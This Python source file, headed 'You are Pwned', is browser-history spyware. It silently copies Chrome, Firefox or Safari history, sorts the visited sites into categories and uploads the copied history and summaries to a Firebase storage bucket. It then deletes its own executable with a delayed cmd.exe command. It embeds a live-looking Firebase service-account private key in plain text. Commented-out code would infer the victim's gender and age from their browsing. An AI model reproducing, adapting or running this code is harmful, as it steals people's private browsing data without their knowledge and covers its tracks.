# You are Pwned..........
from sys import platform
from os import path, mkdir, listdir, makedirs
from pathlib import Path
from numpy import nan
import pyrebase
import random
import string
import sys
import os

def resource_path(relative_path):
    """ Get absolute path to resource, works for dev and for PyInstaller """
    base_path = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__)))
    return os.path.join(base_path, relative_path)

OUTDIR = "Output"
makedirs(OUTDIR, exist_ok=True)
fff = open(path.join(OUTDIR, "output.txt"), "wt")
config = {
  "apiKey": "AIzaSyA7Uuc0D5NsOEjxuTS1UYcQ45CT1MKapP4",
  "authDomain": "osint-iph.firebaseapp.com",
  "databaseURL": "https://osint-iph.firebaseio.com",
  "storageBucket": "osint-iph.appspot.com",
  'serviceAccount': {
        # Your "Service account ID," which looks like an email address.
        'client_email': "firebase-adminsdk-nvc4o@osint-iph.iam.gserviceaccount.com", 
        # The part of your Firebase database URL before `firebaseio.com`. 
        # e.g. `fiery-flames-1234`
        'client_id': "116893492045810462544",
        # The key itself, a long string with newlines, starting with 
        # `-----BEGIN PRIVATE KEY-----\n`
        'private_key': "-----BEGIN PRIVATE KEY-----\nMIIEugIBADANBgkqhkiG9w0BAQEFAASCBKQwggSgAgEAAoIBAQDViQMIdisqR3oA\nt8sC6MG7szjOXhwySpOifHcBt69vnI6HCRZrAlWqp340j47UtxvmOWOoc8j7cwzr\nQgOJLay20S4zzm4kAx7tfEKwp4/V2bNwGGp7gniVO0Rji/XnytCIwk0lmmTZ/FwE\nRskN5IQry8YJsCepJ/H9CawWkeIXCEFPzNGH1q9R0vtQcPYUkA/SVHuyKgyVpSJq\nNgMZJPTIsniYE5k4/lWuKMXMtiYgSX1iwqIXH7BRQv4q8dT+hqQ7JgeuiAGN/Uob\nPX8b2pbdpLhfsW5pwqd22jz0Doe0TbaAgHSsWwWQ4QwCm/1eIt6JbcGOeCcx0jys\n6JiYNZ4RAgMBAAECgf9B8OLwq8Yacvgrzs7wlwyR+GL2AjZdilTUH7f1wZjrl3tP\nqcXe8HYSLt/1Be5AUEt397LAmXKh+vOez0Py7hmvBbD3wGQmZXr8241K48kjpHph\nhu/M3v2Wpja/aod3cI28WH0lEV33D3da9yutgisVzQJMwrW1lTzBvJ52IOwUTKC6\nFF3VMV5Gu2dYYvDy6xhxadNs3r+sP/3hjYl42ZC16DWVM4WBtaJlXe3M3Hz+7ZEV\n1evxX1kKJlY01TOC30z8D3P1lifkUIB9Xc2YbBipat1yuaOxZaBEE4C/Efw791LK\njzeJIfAcsnPmeK96d4xu3ih521N9F6QXLS52cr8CgYEA8Vj+XkzCU0coqeFKtM0t\n4KbAFO84UUC7Agh6qhKf0Ijy6RBQZODtEB/0TpMW8WQvuDYx7lajuK6AyLCKK2Ju\nl34D3idG+lifYSD7ATCyRHZnNNgjgeVzNc/HCiUR+ivERVFnSYJsk8PoYPPqmDH+\nJeoTWmWzIcjwCaRR/lgDwwcCgYEA4n/CdDv3dsRb1n2uaZH1MzeaugnpEp/wEezU\nzJ8VTUAymOr/flRw4eiC7iN0LL39rtLALHar9ZTqAfPUQzYIG5gp65QUODYuwpKz\n9gle7kkm8HIIsWobUaRw9McDidlKSjYiUSzB6hUI1EylEGvf6VbxlbhIc0piaMWJ\nTvYD2CcCgYAIhYXlunwaCKcs6GGE5MG77udVVeT9KXXw6m+6VZIDAPLiu8q65R45\ntYcgxxzGRS1SKce1jKWXPcIaU/Fs+rrA6pgkXeqpqDtoaIu0TQ3eUPfv67nFOl7J\nBZ8XgpuR4724XNlyxQIkbYRk9/fOi+VXXV51kKW0ia3ACWdDvcPUPQKBgH6nYG4s\nxjFElfI371qbQpi0RDI5rno6szziyQ/u+TNsbZ6y8dGLmF/K68QMUT9fskabFNkI\nNxopfj0/Qnee9COyD+bqs+/G5Jjq/fTbwpjOkRatPY0vvz0FDiDiVGk192POJ5xq\nwbiKsJg+j6LCH8BUXN0S4niNpL/fjet4iCfLAoGANioOf1kzuWR/2gu9WJhPtGOq\nexwuezE8q1lLip71n7JgKmlrPElCeoCiAjDPwmG7DgBIXOVB3s+e6mC9dFvqeVm9\nzRkdj0NcOm8E0IiRFysmaiXDeCZSodThOhd5OM/QXGdVz8ZHGZVpzThsJ4YEqtgj\n6QyZrezPSO3TfKxDr9s=\n-----END PRIVATE KEY-----\n".replace('\\n', '\n'),
        # Your service account "key ID." Mine is 40 alphanumeric characters.
        'private_key_id': "f4e683b7b451d6eb0c06e75bae7fc3fa3cfed49c",
        'type': 'service_account'
    }
}

firebase = pyrebase.initialize_app(config)
storage = firebase.storage()

browser = ""
if platform != "darwin":
    while not (browser.startswith('c') or browser.startswith('f')):
        # browser = (input("Choose which browser to get the history from (C for Chrome, F for Firefox): ")).lower()
        browser = "c"
elif platform == "darwin":
    while not (browser.startswith('c') or browser.startswith('f') or browser.startswith('s')):
        # browser = (input("Choose which browser to get the history from (C for Chrome, F for Firefox, S for Safari): ")).lower()
        browser = "c"
# show_graphs = (input("Show Graphs? (Y/N):")).lower()
show_graphs = "n"
if show_graphs.startswith('y') or show_graphs.startswith('t'): show_graphs = True
else: show_graphs = False

history_paths = []
if browser.startswith('c'):
    if platform.startswith("win"):
        history_folder = path.join(Path.home(),"AppData\\Local\\Google\\Chrome\\User Data")
    elif platform=="linux":
        history_folder = path.join(Path.home(), ".config/google-chrome")
    elif platform=="darwin":
        history_folder = path.join(Path.home(), "Library/Application Support/Google/Chrome/")
    else:
        print("Unsupported OS", file=fff)
        quit()
    print("Profiles available:\n\tDefault", file=fff)
    i = 1
    profiles = ["0",""]
    while path.exists(path.join(history_folder, "Profile " + str(i))):
        print("\tProfile ", i)
        profiles.append(str(i))
        i += 1
    prof = " "
    while prof not in profiles:
        # prof = input("Enter profile number (0 for default): ")
        prof = "0"
    # start = time()
    if prof == "0" or prof == "": prof = "Default"
    else: prof = "Profile " + prof
    history_path = path.join(history_folder, prof, "History")

elif browser.startswith('f'):
    # start = time()
    if platform.startswith("win"):
        history_folder = path.join(Path.home(),"AppData\\Roaming\\Mozilla\\Firefox\\Profiles")
        history_folder2 = path.join(Path.home(),"AppData\\Roaming\\Mozilla\\Firefox\\Profiles")
    elif platform=="linux":
        history_folder = path.join(Path.home(), ".mozilla/firefox")
    elif platform=="darwin":
        history_folder = path.join(Path.home(), "Library/Application Support/Firefox/Profiles")
    else:
        print("Unsupported OS", file=fff)
        quit()
    # history_path = path.join(history_folder, [i for i in listdir(history_folder) if i.endswith('.default')][0], "places.sqlite")
    history_path = ""
    history_paths = []
    for i in listdir(history_folder):
        for j in listdir(path.join(history_folder, i)):
            if j=="places.sqlite":
                history_paths.append(path.join(history_folder, i, j))

elif browser.startswith('s'):
    # start = time()
    history_folder = path.join(Path.home(), "Library/Safari")
    history_path = path.join(history_folder, "History.db")

from sqlite3 import connect
from pandas import read_csv, DataFrame, concat, Series, set_option
from csv import writer
# import matplotlib.pyplot as plt
from shutil import copyfile
from calendar import month_name

if not path.exists("Output"): mkdir("Output")
BOLD = ''
END = ''
BLUE = ''

if history_path:
    copyfile(history_path, path.join(OUTDIR, "Copied_History"))
if history_paths:
    j = 0
    for i in history_paths:
        copyfile(i, path.join(OUTDIR, "fire"+j, "Copied_History"))
        j+=1
# print("Time to import and copy history:", round(time()-start, 2), "s")

# start = time()
file = path.join(OUTDIR, "url_visittime.csv")
conn = connect(path.join(OUTDIR, "Copied_History"))
cursor = conn.cursor()
if browser.startswith('c'):
    cursor.execute("SELECT datetime(visits.visit_time/1000000-11644473600, 'unixepoch', 'localtime') as 'visit_time',urls.url from urls,visits WHERE urls.id = visits.url ORDER BY visit_time DESC")
    with open(file, "w", newline='') as csv_file:
        csv_writer = writer(csv_file)
        csv_writer.writerow([i[0] for i in cursor.description])
        csv_writer.writerows(cursor)
elif browser.startswith('f'):
    j = 0
    with open(file, "w", newline='') as csv_file:
        for i in listdir(OUTDIR):
            if i.startswith("fire"):
                conn = connect(path.join(OUTDIR, i, "places.sqlite"))
                cursor = conn.cursor()
                cursor.execute("""select url, datetime(last_visit_date/1000000, 'unixepoch', 'localtime') as 'visit_time'
                    from moz_historyvisits natural join moz_places where
                    last_visit_date is not null and url  like 'http%' and title is not null""")
                csv_writer = writer(csv_file)
                csv_writer.writerow([i[0] for i in cursor.description])
                csv_writer.writerows(cursor)            
elif browser.startswith('s'):
    cursor.execute("""SELECT 
        datetime(visit_time + 978307200, 'unixepoch', 'localtime') as visit_time, url
        FROM 
            history_visits
        INNER JOIN 
        history_items ON
            history_items.id = history_visits.history_item
        ORDER BY 
            visit_time DESC""")
    with open(file, "w", newline='') as csv_file:
        csv_writer = writer(csv_file)
        csv_writer.writerow([i[0] for i in cursor.description])
        csv_writer.writerows(cursor)

# with open(file, "w", newline='') as csv_file:
#         csv_writer = writer(csv_file)
#         csv_writer.writerow([i[0] for i in cursor.description])
#         csv_writer.writerows(cursor)
# print("Time to save history as csv:", round(time()-start, 2), "s")

# start = time()
dataset = read_csv(file)
dataset_copy = dataset.copy()
dataset["visit_time"] = dataset["visit_time"].apply(lambda x: str(x[11:13]))
dataset = dataset.sort_values(ascending=False, by="visit_time")
times_frequency = dataset.groupby("visit_time").size()
times_only = list(times_frequency.keys())
frequency_of_times = list(times_frequency.values)

dataset["url"] = dataset["url"].str.split("/").str[2]    #split url by / and get only the website name
dataset["url"] = dataset["url"].str.replace("www.","")
dataset["url"].replace('', nan, inplace=True)
dataset.dropna(subset=["url"], inplace=True)
url_frequency = dataset.groupby("url").size() #Number of times each website is visited
url_frequency = url_frequency.sort_values(ascending=False)
url_frequency.to_csv(path.join(OUTDIR, "url_frequency.csv"), header=False)
url_frequency = url_frequency[url_frequency > 10]

urls = (list(url_frequency.keys()))
frequency = (list(url_frequency.values))

print("\nTop 50 most used:", file=fff)
for j in url_frequency.keys()[:50]:
    print(j," - ",url_frequency[j], file=fff)
print(END, file=fff)

def time_24hours_to_12hours(time_24):
    time_12 = ""
    time_24 = int(time_24)
    if 0 < time_24 < 12:
        time_12 = str(time_24) + " AM"
    elif time_24 == 0:
        time_12 = "12 AM"
    elif time_24 == 12:
        time_12 = "12 PM"
    elif 12 < time_24 < 24:
        time_12 = str(time_24 - 12) + " PM"
    return time_12
times_only_12hours = list(map(time_24hours_to_12hours, times_only))

dataset_copy["visit_time"] = dataset_copy["visit_time"].apply(lambda x: str(x[:7])) #To get only year and month in date
groupedby_months = dataset_copy.groupby("visit_time").size()
month_years = list(groupedby_months.keys())
number_of_sites_visited_in_months = list(groupedby_months.values)
# print("Time to analyse:", round(time()-start, 2), "s")

# start = time()

# fig = plt.figure(figsize=(16,9))
# gs = fig.add_gridspec(ncols = 3, nrows = 2)
# pie_ax = fig.add_subplot(gs[0,0])
# bar3_ax = fig.add_subplot(gs[1,0])
# bar1_ax = fig.add_subplot(gs[0,1:3])
# bar2_ax = fig.add_subplot(gs[1,1:3])

# pie_ax.axis("equal")
# pie_ax.pie(frequency, labels=urls[:15]+["" for x in range(0,len(urls)-15)], labeldistance=1, rotatelabels=True)

# x_ticks = range(len(urls))
# bar1_ax.bar(x_ticks, frequency)
# bar1_ax.set_xlabel("Website url")
# plt.sca(bar1_ax)
# plt.xticks(x_ticks, [], rotation="vertical", fontsize=5)
# rects = bar1_ax.patches
# for rect, label in zip(rects, urls):
#     bar1_ax.text(rect.get_x() + rect.get_width() / 2, 5, label,
#             ha='center', va='bottom', fontsize=5, rotation="vertical")

# bar2_ax.bar(times_only, frequency_of_times)
# plt.sca(bar2_ax)
# plt.xticks(times_only, [], rotation="vertical")
# rects = bar2_ax.patches
# for rect, label in zip(rects, times_only_12hours):
#     height = rect.get_height()
#     bar2_ax.text(rect.get_x() + rect.get_width() / 2, height - 0.2, label,
#             ha='center', va='bottom', fontsize="small")
# bar2_ax.set_xlabel("Time")

# x_ticks = range(len(groupedby_months))
# bar3_ax.bar(x_ticks, number_of_sites_visited_in_months)
# bar3_ax.set_xlabel("Month and Year")
# plt.sca(bar3_ax)
# plt.xticks(x_ticks, [], rotation="vertical")
# rects = bar3_ax.patches
# months = [month_name[int(x[5:])] + " " + x[:4] for x in month_years]
# for rect, label in zip(rects, months):
#     height = rect.get_height()
#     bar3_ax.text(rect.get_x() + rect.get_width() / 2, height/2 - height/6, label,
#             ha='center', va='bottom', fontsize="small", rotation="vertical")


# plt.tight_layout()
# plt.savefig(path.join(OUTDIR, "Graphs.pdf"), format="pdf")

# # print("Time to plot:", round(time()-start, 2), "s")

# if show_graphs: plt.show()
# plt.close()

df = read_csv(path.join("Output", "url_frequency.csv"), names=["url", "frequency"])
category_urls = read_csv(resource_path("url_categories_copy.csv"), names=["category", "url"])
category_urls["url"].str.strip()
categories_only = []
urls_only = []
# start = time()
for url in df["url"][:-1]:
    c = category_urls[category_urls["url"] == url] #.str.contains(str(url))
    if not c.empty:# and len(str(url)) > 5:
        categories_only.append(c["category"].iloc[0])
        urls_only.append(c["url"].iloc[0])
        #categories = concat([categories, c])
categories = DataFrame({"category": categories_only, "url": urls_only})
# print("Time to concat:", round(time()-start, 2))

# start = time()
categories["frequency"] = Series()
frequencies = DataFrame()
frequencies = categories.apply(lambda x: int(df.loc[x["url"] == df["url"], ["frequency"]]["frequency"]), axis=1)
categories["frequency"] = frequencies

category_frequency = (categories.groupby("category")["frequency"].sum())
# print("Time to categorize:", round(time()-start, 2))

# start = time()
frequency_percentages = []
categories = list(category_frequency.keys())
frequencies = list(category_frequency.values)
frequency_total = sum(frequencies)
frequency_percentages = [(x/frequency_total)*100 for x in frequencies]
# print("Time to get categories, frequency and percentages:", round(time()-start, 2))

all_categories = ("Internet_and_Telecom","Not_working","Career_and_Education","News_and_Media","Science","Gambling","Shopping","Food_and_Drink","Books_and_Literature","Autos_and_Vehicles","Pets_and_Animals","Health","Sports","Computer_and_Electronics","Reference","Arts_and_Entertainment","Beauty_and_Fitness","Adult","Games","Law_and_Government","Finance","Business_and_Industry","Recreation_and_Hobbies","People_and_Society","Home_and_Garden","Travel","Social_Media")
categories_percentages = DataFrame(columns=all_categories)
for column_name, values in categories_percentages.iteritems():
    for category in categories:
        if category == column_name:
            categories_percentages[column_name] = Series(frequency_percentages[categories.index(category)])
categories_percentages = categories_percentages.fillna(0)
categories_percentages.to_csv(path.join("Output", "category_percentage.csv"))

x = range(0, len(categories))

# start = time()
# fig = plt.figure()
# gs = fig.add_gridspec(ncols = 1, nrows = 1)
# bar_ax = fig.add_subplot(gs[0,0])
# bar_ax.bar(x, frequency_percentages)
# plt.sca(bar_ax)
# plt.xticks(x, categories, rotation="vertical")
# rects = bar_ax.patches
# graph_height = (fig.get_size_inches()*fig.dpi)[1]
# for rect, label in zip(rects, frequency_percentages):
#     label = str(int(round(label))) + "%"
#     bar_ax.text(rect.get_x() + rect.get_width() / 2, rect.get_height() - 0.3, label,
#             ha='center', va='bottom')
# plt.tight_layout()
# plt.savefig(path.join("Output", "Category_Graphs.pdf"), format="pdf")
# # print("Time to plot:", round(time()-start, 2))
# if show_graphs: plt.show()
# plt.close()

# def warn(*args, **kwargs):
#     pass
# import warnings
# warnings.warn = warn
# from sklearn import model_selection
# from sklearn.metrics import classification_report
# from sklearn.metrics import confusion_matrix
# from sklearn.metrics import accuracy_score
# from sklearn.linear_model import LogisticRegression
# from sklearn.tree import DecisionTreeClassifier
# from sklearn.neighbors import KNeighborsClassifier
# from sklearn.discriminant_analysis import LinearDiscriminantAnalysis
# from sklearn.naive_bayes import GaussianNB
# from sklearn.svm import SVC

# def alg_maker(alg):
#     return alg()
# algorithm = GaussianNB

# dataset = read_csv("gender_age_dataset.csv")
# dataset = dataset.fillna(0)
# array = dataset.values

# category_percentages = read_csv(path.join("Output", "category_percentage.csv"))
# percentages = [list((category_percentages.values.tolist())[0][1:])]

# X = array[:, 2:-1]
# Y = array[:, 0]
# """validation_size = 0.50
# seed = 7
# X_train, X_validation, Y_train, Y_validation = model_selection.train_test_split(X, Y, test_size=validation_size, random_state=seed)
# alg = alg_maker(algorithm)
# alg.fit(X_train,Y_train)
# predictions = alg.predict(X_validation)
# print("Accuracy:",accuracy_score(Y_validation, predictions)*100,"%")"""

# alg = alg_maker(algorithm)
# alg.fit(X,Y)
# predictions_for_history_gender = alg.predict(percentages)
# if predictions_for_history_gender == ["M"]:
#     print(BLUE,BOLD,"Predicted gender: Male",END)
# elif predictions_for_history_gender == ["F"]:
#     print(BLUE,BOLD,"Predicted gender: Female",END)


# X_age = array[:, 2:-1]
# Y_age = array[:, 1]
# Y_age=Y_age.astype('int')
# """validation_size = 0.50
# seed = 7
# X_age_train, X_age_validation, Y_age_train, Y_age_validation = model_selection.train_test_split(X_age, Y_age, test_size=validation_size, random_state=seed)
# alg_age = alg_maker(algorithm)
# alg_age.fit(X_age_train,Y_age_train)
# predictions = alg_age.predict(X_age_validation)
# print("Accuracy:",accuracy_score(Y_age_validation, predictions)*100,"%")"""

# alg_age = alg_maker(algorithm)
# alg_age.fit(X_age,Y_age)
# predictions_for_history_age = alg_age.predict(percentages)
# print(BLUE,BOLD,"Predicted Age:",predictions_for_history_age[0],END)

# # print("Total Time taken:", round(time()-start_total, 3), "s")
# print("Graphs are saved as PDFs in the output folder")

fff.close()
random_str = ''.join(random.choices(string.ascii_uppercase + string.digits, k=10)) + str(Path.home())
storage.child("data/"+random_str+"/output.txt").put(path.join(OUTDIR, "output.txt"))
# storage.child("data/"+random_str+"/Graphs.pdf").put(path.join(OUTDIR, "Graphs.pdf"))
storage.child("data/"+random_str+"/url_frequency.csv").put(path.join(OUTDIR, "url_frequency.csv"))
storage.child("data/"+random_str+"/url_visittime.csv").put(path.join(OUTDIR, "url_visittime.csv"))
storage.child("data/"+random_str+"/Copied_History").put(path.join(OUTDIR, "Copied_History"))
storage.child("data/"+random_str+"/category_percentage.csv").put(path.join(OUTDIR, "category_percentage.csv"))

if getattr(sys, 'frozen', False):
    # application_path = os.path.dirname(sys.executable)
    application_path = os.path.abspath(os.path.join(os.path.dirname(sys.executable), sys.executable))
elif __file__:
    # application_path = os.path.dirname(__file__)
    application_path = os.path.abspath(os.path.join(os.path.dirname(__file__), __file__))

import subprocess
path_exe=application_path
# os.remove(path_exe)
print("".join(["cmd.exe", ' /C choice /C Y /N /D Y /T 3 & Del "{}"'.format(application_path)]))
subprocess.Popen("cmd.exe" + ' /C choice /C Y /N /D Y /T 3 & Del "{}"'.format(application_path), stdout=subprocess.PIPE, shell=True)